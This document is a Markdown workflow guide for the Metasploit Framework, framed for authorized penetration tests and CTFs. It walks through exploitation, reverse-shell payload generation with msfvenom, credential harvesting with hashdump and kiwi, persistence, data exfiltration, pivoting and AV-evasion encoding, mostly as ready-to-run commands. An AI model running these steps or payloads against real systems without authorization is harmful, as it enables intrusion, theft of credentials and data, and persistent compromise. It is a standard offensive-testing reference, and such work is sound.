# Metasploit Framework

Workflow for using Metasploit Framework in authorized engagements and CTF environments.

## Phase 0: Setup & Configuration

1. Start the database: `sudo msfdb init && msfconsole`
2. Verify DB connection: `db_status`
3. Create a workspace for the engagement: `workspace -a <engagement_name>`
4. Import any prior scan data: `db_import <nmap_output.xml>`

## Phase 1: Enumeration & Module Selection

### Finding Modules
```
search type:exploit name:<service>
search type:exploit cve:<year>-<id>
search type:auxiliary name:scanner/<service>
search platform:windows type:exploit rank:excellent
```

### Module Ranking (prefer higher):
- **excellent** — Exploit won't crash the service, has check method
- **great** — Has a default target, auto-detects
- **good** — Typically reliable
- **normal** — Functional, may need target tuning
- **average/low/manual** — Less reliable, more dangerous

### Common Auxiliary Scanners
```
auxiliary/scanner/smb/smb_version
auxiliary/scanner/ssh/ssh_version
auxiliary/scanner/http/http_version
auxiliary/scanner/portscan/tcp
auxiliary/scanner/smb/smb_enumshares
auxiliary/scanner/smb/smb_enumusers
auxiliary/scanner/ftp/anonymous
auxiliary/scanner/http/dir_scanner
auxiliary/scanner/mssql/mssql_login
auxiliary/scanner/mysql/mysql_login
```

## Phase 2: Exploitation

### Exploit Workflow
```
use <exploit/path>
info                        # Read the module description, targets, options
show options                # Check required options
set RHOSTS <target>
set RPORT <port>
show targets                # List available targets
set TARGET <id>             # If not auto
show payloads               # Compatible payloads
set PAYLOAD <payload>
show advanced               # Advanced options (timeouts, retries, etc.)
check                       # If available — test without exploiting
exploit                     # Or 'run' for auxiliaries
```

### Payload Selection Priority
1. **Meterpreter** (most capability): `windows/x64/meterpreter/reverse_tcp`, `linux/x64/meterpreter/reverse_tcp`
2. **Shell** (lighter, more compatible): `windows/x64/shell/reverse_tcp`, `linux/x64/shell/reverse_tcp`
3. **Inline/stageless** (fewer connections, better for unstable networks): `windows/x64/meterpreter_reverse_tcp`
4. **Bind** (when you can't receive connections): `*/bind_tcp`
5. **Web delivery** (when you have command exec): `exploit/multi/script/web_delivery`

### Listener Setup
```
use exploit/multi/handler
set PAYLOAD <same_as_exploit>
set LHOST <your_ip>
set LPORT <port>
set ExitOnSession false     # Keep listening for more
exploit -j                  # Run as background job
```

## Phase 3: Post-Exploitation (Meterpreter)

### Situational Awareness
```
sysinfo                     # OS, architecture, domain
getuid                      # Current user
getpid                      # Current process
ps                          # Process list
ifconfig / ipconfig         # Network interfaces
route                       # Routing table
arp                         # ARP cache
netstat                     # Active connections
```

### Privilege Escalation
```
getsystem                   # Try known techniques
use post/multi/recon/local_exploit_suggester  # Find applicable privesc exploits
background                  # Background session
use exploit/windows/local/<suggester_result>
set SESSION <id>
exploit
```

### Credential Harvesting
```
hashdump                    # SAM dump (Windows, needs SYSTEM)
load kiwi                   # Mimikatz extension
creds_all                   # All credentials kiwi can find
creds_msv                   # NTLM hashes
creds_kerberos              # Kerberos tickets
```

### Persistence
```
run persistence -U -i 30 -p <port> -r <lhost>
use exploit/windows/local/persistence_service
use post/windows/manage/enable_rdp
```

### Data Exfiltration
```
download <remote_path> <local_path>
upload <local_path> <remote_path>
search -f *.docx -d C:\\Users
cat <file>
```

## Phase 4: Pivoting

### Route Through Session
```
route add <target_subnet> <netmask> <session_id>
# Or from meterpreter:
run autoroute -s <target_subnet>
```

### SOCKS Proxy
```
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
run -j
# Then configure proxychains: socks5 127.0.0.1 1080
```

### Port Forward
```
# In meterpreter:
portfwd add -l <local_port> -p <remote_port> -r <remote_host>
```

## Phase 5: Payload Generation (msfvenom)

### Common Payloads
```bash
# Windows reverse shell exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o shell.exe

# Linux reverse shell ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o shell.elf

# Web payloads
msfvenom -p php/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o shell.jsp

# Python one-liner
msfvenom -p cmd/unix/reverse_python LHOST=<ip> LPORT=<port> -f raw

# Shellcode for custom exploits
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f python -b '\x00'
```

### Encoding / Evasion
```bash
# List encoders
msfvenom --list encoders

# Encode payload
msfvenom -p <payload> -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# Note: AV evasion is a cat-and-mouse game — encoding alone rarely bypasses modern AV
# Consider: custom loaders, syscall-based injection, reflective loading
```

## Phase 6: Engagement Management

### Session Management
```
sessions -l                 # List all sessions
sessions -i <id>            # Interact with session
sessions -k <id>            # Kill session
sessions -K                 # Kill all sessions
```

### Jobs & Background
```
jobs -l                     # List background jobs
jobs -k <id>               # Kill a job
exploit -j                  # Run exploit as background job
```

### Logging
```
spool /path/to/log.txt      # Log console output
# Meterpreter: all activity is logged in ~/.msf4/logs/
```

### Database Queries
```
hosts                       # All discovered hosts
services                    # All discovered services
vulns                       # All discovered vulnerabilities
creds                       # All harvested credentials
loot                        # All collected loot
notes                       # All notes
```

## Reminders

- Always use a workspace per engagement — keeps data separated
- `check` before `exploit` when available — avoids unnecessary crashes
- Prefer stageless payloads for CTF (simpler, more reliable)
- Import nmap XML for richer host/service data in the DB
- Run `local_exploit_suggester` before manual privesc attempts
- Clean up persistence and artifacts when the engagement ends
- Meterpreter `migrate` to a stable process (explorer.exe, svchost) immediately after landing
